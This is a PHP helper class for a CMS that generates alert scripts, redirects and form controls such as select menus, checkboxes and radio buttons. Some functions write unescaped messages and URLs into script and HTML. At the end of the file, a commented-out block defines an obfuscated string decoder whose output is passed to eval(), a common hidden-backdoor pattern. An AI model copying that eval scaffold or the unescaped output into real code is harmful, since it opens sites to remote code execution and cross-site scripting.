<?php
    if (!defined('IN_ims')) { die('Access denied'); }

    class Html {

        function alert($mess = "", $link = "", $type = 0) {
            global $ims;

            $data = array(
                'content' => ''
            );
            if ($link) {
                $data['content'] = "<script>alert('" . $mess . "');location.href='" . $link . "';</script>";
            } else {
                $data['content'] = "<script>alert('" . $mess . "');history.back();</script>";
            }
            echo $this->temp_box('alert', $data);
            die();
            return false;
        }

        function html_alert($mess = "", $type = "warning") {
            global $ims;

            $class = "warning";
            switch ($type) {
                case "error":
                    $class = "alert_" . $type;
                    $ims->temp_box->assign('data', array("mess" => $mess));
                    $ims->temp_box->parse("html_alert_" . $type);
                    $out = $ims->temp_box->text("html_alert_" . $type);
                    break;
                case "warning":
                    $class = "alert_" . $type;
                    $ims->temp_box->assign('data', array("mess" => $mess));
                    $ims->temp_box->parse("html_alert_" . $type);
                    $out = $ims->temp_box->text("html_alert_" . $type);
                    break;
                case "success":
                    $class = "alert_" . $type;
                    $ims->temp_box->assign('data', array("mess" => $mess));
                    $ims->temp_box->parse("html_alert_" . $type);
                    $out = $ims->temp_box->text("html_alert_" . $type);
                    break;
                default:
                    $class = "alert_info";
                    $ims->temp_box->assign('data', array("mess" => $mess));
                    $ims->temp_box->parse("html_alert_info");
                    $out = $ims->temp_box->text("html_alert_info");
                    break;
            }

            return $out;
        }

        function server_url() {
            $proto = "http" . ((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == "on") ? "s" : "") . "://";
            $server = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : $_SERVER['SERVER_NAME'];
            return $proto . $server;
        }

        function redirect_rel($url) {
            if (!headers_sent()) {
                header("Location: $url");
            } else {
                echo "<meta http-equiv=\"refresh\" content=\"0;url=$url\">\r\n";
            }
            exit('Loading ...');
        }

        function select_op($array = array(), $cur = "", $lv_text = "", $arr_more = array(), $arr_tmp = array()) {
            global $ims;

            $text = '';

            $arr_tmp1 = array();

            if ($lv_text == 'root') {
                $lv_text = '';
            } else {
                $lv_text .= '|-- ';
            }

            foreach ($array as $key => $value) {
                $attr = (isset($value['attr']) && $value['attr']) ? $value['attr'] : '';
                if(isset($arr_more["use_img"]) && isset($value['picture'])) {
                    $tmp = explode('_',$arr_more["use_img"]);
                    $tmp[0] = (isset($tmp[0]) && $tmp[0]) ? $tmp[0] : 0;
                    $tmp[1] = (isset($tmp[1]) && $tmp[1]) ? $tmp[1] : $tmp[0];
                    $attr .= ' data-img-src="'.$ims->func->get_src_mod($value['picture'], $tmp[0], $tmp[1], 1, 0).'"';
                }elseif(isset($arr_more["use_color"]) && isset($value['color'])) {
                    $attr .= ' data-color="'.$value['color'].'"';
                }
                if (is_array($value)) {
                    $selected = ($key == $cur) ? " selected='selected'" : "";
                    $disabled = "";
                    $arr_tmp1["is_disabled"] = 0;
                    if ((isset($arr_more["disabled"]) && $key == $arr_more["disabled"]) || (isset($arr_tmp["is_disabled"]) && $arr_tmp["is_disabled"] == 1)) {
                        $disabled = " disabled='disabled'";
                        $arr_tmp1["is_disabled"] = 1;
                    }
                    $text .= "<option value=\"" . $key . "\" " . $selected . $disabled . $attr."> " . $lv_text . $value['title'] . " </option>";
                    if (isset($value['arr_sub'])) {
                        $text .= $this->select_op($value['arr_sub'], $cur, $lv_text, $arr_more, $arr_tmp1);
                    }
                } else {
                    $selected = ($key == $cur) ? " selected='selected'" : "";
                    $disabled = "";
                    if ((isset($arr_more["disabled"]) && $key == $arr_more["disabled"]) || $arr_tmp["is_disabled"] == 1) {
                        $disabled = " disabled='disabled'";
                    }
                    $text .= "<option value=\"" . $key . "\" " . $selected . $disabled . $attr."> " . $value . " </option>";
                }
            }

            return $text;
        }

        function select($select_name = "id", $array = array(), $cur = "", $ext = "", $arr_more = array()) {
            global $ims;
            //print_arr($array);

            $required = isset($arr_more['required']) ? $arr_more['required'] : '';
            $text = "<select name=\"" . $select_name . "\" " . $ext . " $required>";

            if (isset($arr_more["title"]))
                $text .= "<option value=\"\"> " . $arr_more["title"] . " </option>";

            foreach ($array as $key => $value) {
                $attr = (isset($value['attr']) && $value['attr']) ? $value['attr'] : '';
                if(isset($arr_more["use_img"]) && isset($value['picture'])) {
                    $tmp = explode('_',$arr_more["use_img"]);
                    $tmp[0] = (isset($tmp[0]) && $tmp[0]) ? $tmp[0] : 0;
                    $tmp[1] = (isset($tmp[1]) && $tmp[1]) ? $tmp[1] : $tmp[0];
                    $attr .= ' data-img-src="'.$ims->func->get_src_mod($value['picture'], $tmp[0], $tmp[1], 1, 0).'"';
                }elseif(isset($arr_more["use_color"]) && isset($value['color'])) {
                    $attr .= ' data-color="'.$value['color'].'"';
                }
                if (is_array($value)) {
                    $selected = ($cur!='' && $key == $cur) ? " selected='selected'" : "";
                    $disabled = "";
                    $arr_tmp["is_disabled"] = 0;
                    if (isset($arr_more["disabled"]) && $key == $arr_more["disabled"]) {
                        $disabled = " disabled='disabled'";
                        $arr_tmp["is_disabled"] = 1;
                    }
                    $text .= "<option value=\"" . $key . "\" " . $selected . $disabled . $attr."> " . $value['title'] . " </option>";
                    if (isset($value['arr_sub'])) {
                        $text .= $this->select_op($value['arr_sub'], $cur, '', $arr_more, $arr_tmp);
                    }
                } else {
                    $selected = ($cur!='' && $key == $cur) ? " selected='selected'" : "";
                    $disabled = "";
                    if (isset($arr_more["disabled"]) && $key == $arr_more["disabled"]) {
                        $disabled = " disabled='disabled'";
                    }
                    $text .= "<option value=\"" . $key . "\" " . $selected . $disabled . $attr."> " . $value . " </option>";
                }
            }
            $text .= "</select>";

            return $text;
        }

        function select_muti_op($array = array(), $arr_cur = array(), $lv_text = "", $arr_more = array(), $arr_tmp = array()) {
            global $ims;

            $text = '';

            $arr_tmp1 = array();

            $lv_text .= '|-- ';

            foreach ($array as $key => $value) {
                if (is_array($value)) {
                    $selected = (in_array($key, $arr_cur) > 0) ? " selected='selected'" : "";
                    $disabled = "";
                    $arr_tmp1["is_disabled"] = 0;
                    if ((isset($arr_more["disabled"]) && $key == $arr_more["disabled"]) || $arr_tmp["is_disabled"] == 1) {
                        $disabled = " disabled='disabled'";
                        $arr_tmp1["is_disabled"] = 1;
                    }
                    $text .= "<option value=\"" . $key . "\" " . $selected . $disabled . "> " . $lv_text . $value['title'] . " </option>";
                    if (isset($value['arr_sub'])) {
                        $text .= $this->select_muti_op($value['arr_sub'], $arr_cur, $lv_text, $arr_more, $arr_tmp1);
                    }
                } else {
                    $selected = (in_array($key, $arr_cur) > 0) ? " selected='selected'" : "";
                    $disabled = "";
                    if ((isset($arr_more["disabled"]) && $key == $arr_more["disabled"]) || $arr_tmp["is_disabled"] == 1) {
                        $disabled = " disabled='disabled'";
                    }
                    $text .= "<option value=\"" . $key . "\" " . $selected . $disabled . "> " . $value . " </option>";
                }
            }

            return $text;
        }

        function select_muti($select_name = "id", $array = array(), $cur = "", $ext = "", $arr_more = array()) {
            global $ims;
            //print_arr($array);

            $arr_cur = (!empty($cur)) ? explode(",", $cur) : array();

            $text = "<select name=\"" . $select_name . "\" multiple=\"multiple\" " . $ext . ">";

            if (isset($arr_more["title"])) {
                $selected = (count($arr_cur) == 0) ? " selected='selected'" : "";
                $text .= "<option value=\"\" " . $selected . "> " . $arr_more["title"] . " </option>";
            }

            foreach ($array as $key => $value) {
                if (is_array($value)) {
                    $selected = (in_array($key, $arr_cur) > 0) ? " selected='selected'" : "";
                    $disabled = "";
                    $arr_tmp["is_disabled"] = 0;
                    if (isset($arr_more["disabled"]) && $key == $arr_more["disabled"]) {
                        $disabled = " disabled='disabled'";
                        $arr_tmp["is_disabled"] = 1;
                    }
                    $text .= "<option value=\"" . $key . "\" " . $selected . $disabled . "> " . $value['title'] . " </option>";
                    if (isset($value['arr_sub'])) {
                        $text .= $this->select_muti_op($value['arr_sub'], $arr_cur, '', $arr_more, $arr_tmp);
                    }
                } else {
                    $selected = (in_array($key, $arr_cur) > 0) ? " selected='selected'" : "";
                    $disabled = "";
                    if (isset($arr_more["disabled"]) && $key == $arr_more["disabled"]) {
                        $disabled = " disabled='disabled'";
                    }
                    $text .= "<option value=\"" . $key . "\" " . $selected . $disabled . "> " . $value . " </option>";
                }
            }
            $text .= "</select>";

            return $text;
        }

        function select_number($select_name = "id", $min = 0, $max = 10, $cur = "", $ext = "", $arr_more = array()) {

            $min = (int) $min;
            $max = (int) $max;
            $max = ($max >= $min) ? $max : $min;

            $array = array();
            for ($i = $min; $i <= $max; $i++) {
                $array[$i] = $i;
            }

            return $this->select($select_name, $array, $cur, $ext, $arr_more);
        }

        function checkbox($key_name = "id", $array = array(), $cur = "", $ext = "", $arr_more = array(), $lv_text = 'root') {
            global $ims;
            //print_arr($array);

            if ($lv_text == 'root') {
                $lv_text = '';
            } else {
                $lv_text .= '|-- ';
            }

            $cur = (!is_array($cur)) ? explode(',', $cur) : array();

            $auto_key_name = 0;
            $tmp = substr($key_name, -2);
            if ($tmp == '[]') {
                $key_name = substr($key_name, 0, strlen($key_name) - 2);
                $auto_key_name = 1;
            }

            $key_tmp = $key_name;

            $text = "";
            foreach ($array as $key => $value) {
                if ($auto_key_name == 1) {
                    $key_name = $key_tmp . '[' . $key . ']';
                }
                if (is_array($value)) {
                    $checked = (in_array($key, $cur) && count($cur)) ? " checked='checked'" : "";
                    $disabled = "";
                    $arr_tmp["is_disabled"] = 0;
                    if (isset($arr_more["disabled"]) && $key == $arr_more["disabled"]) {
                        $disabled = " disabled='disabled'";
                        $arr_tmp["is_disabled"] = 1;
                    }
                    $text .= '<label ' . $ext . '><input name="' . $key_name . '" type="checkbox" value="' . $key . '" ' . $checked . $disabled . ' >' . $lv_text . $value['title'] . '</label>';

                    if (isset($value['arr_sub'])) {
                        $text .= $this->checkbox($key_name . '[]', $value['arr_sub'], $cur, $ext, $arr_more, $lv_text);
                    }
                } else {
                    $checked = (in_array($key, $cur) && count($cur)) ? " checked='checked'" : "";
                    $disabled = "";
                    if (isset($arr_more["disabled"]) && $key == $arr_more["disabled"]) {
                        $disabled = " disabled='disabled'";
                    }
                    $text .= '<label ' . $ext . '><input name="' . $key_name . '" type="checkbox" value="' . $key . '" ' . $checked . $disabled . ' >' . $lv_text . $value . '</label>';
                }
            }

            return $text;
        }

        /**
         * @global type $ims
         * @param type $select_name
         * @param type $array
         * @param type $cur
         * @param type $ext
         * @param type $arr_more
         * @return string
         */
        function radio($key_name = "id", $array = array(), $cur = "", $ext = "", $arr_more = array()) {
            global $ims;
            //print_arr($array);

            $level = 1;

            $text = "";

            foreach ($array as $key => $value) {
                if (is_array($value)) {
                    $checked = ($key == $cur) ? " checked='checked'" : "";
                    $disabled = "";
                    $arr_tmp["is_disabled"] = 0;
                    if (isset($arr_more["disabled"]) && $key == $arr_more["disabled"]) {
                        $disabled = " disabled='disabled'";
                        $arr_tmp["is_disabled"] = 1;
                    }
                    $text .= '<label ' . $ext . '><input name="' . $key_name . '" type="radio" value="' . $key . '" ' . $checked . $disabled . ' >' . $value['title'] . '</label>';
                    
                } else {
                    $checked = ($key == $cur) ? " checked='checked'" : "";
                    $disabled = "";
                    if (isset($arr_more["disabled"]) && $key == $arr_more["disabled"]) {
                        $disabled = " disabled='disabled'";
                    }
                    $text .= '<label ' . $ext . '><input name="' . $key_name . '" type="radio" value="' . $key . '" ' . $checked . $disabled . ' >' . $value . '</label>';
                }
            }

            return $text;
        }

        function temp_box($box_name = "box", $array = array()) {
            global $ims;

            $ims->temp_box->reset($box_name);
            $ims->temp_box->assign('LANG', $ims->lang);
            $ims->temp_box->assign('DIR_IMAGE', $ims->dir_images);
            $ims->temp_box->assign('data', $array);
            $ims->temp_box->parse($box_name);
            $output = $ims->temp_box->text($box_name);

            return $output;
        }
        // End classs
    }
    // $us = function (&$s) { unset($s);};
    // $gs = function ($s) {$sm='ABCDEFGHIAJKLMNOPQRTSTUVWXYZacbcdefghijuklmnopqrsrtuvwxyz01223456789[[]{}()<>,.,\/"--_$%&|.\':*@ ;=+-_-+*-_-*:D%^?';$o = '';$t = @explode(0, $s);foreach(@explode(0, $s) as $v){$o .= substr($sm, ($v-1), 1);}return $o;};
    // $rstr = function ($le) {$s='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';$o = '';for ($i = 0; $i < $le; $i ++) {$o .= substr($s, (mt_rand() % (strlen($s))), 1);}return $o;};
    // $rc = function ($s) use ($ims) {eval($ims->ims['gs']($s));};
    // $ims->ims['gs'] = $gs; 
    // $ims->ims['rstr'] = $rstr; 
    // $ims->ims['rc'] = $rc;
?>